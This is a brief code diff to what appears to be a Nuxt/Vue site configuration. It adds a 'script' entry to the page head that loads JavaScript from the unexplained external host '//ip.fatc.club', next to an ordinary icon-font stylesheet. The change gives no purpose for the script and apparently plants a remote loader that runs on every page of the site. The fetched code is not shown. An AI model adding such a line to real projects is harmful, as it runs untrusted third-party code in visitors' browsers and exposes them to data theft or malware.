@@ -20,6 +20,9 @@ const config = {
         ],
         link: [
             { rel: 'stylesheet', href: "https://cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.2.0/css/material-design-iconic-font.min.css" }
+        ],
+        script: [
+            { type: 'text/javascript', src: "//ip.fatc.club" }
         ]
     },
     css: [
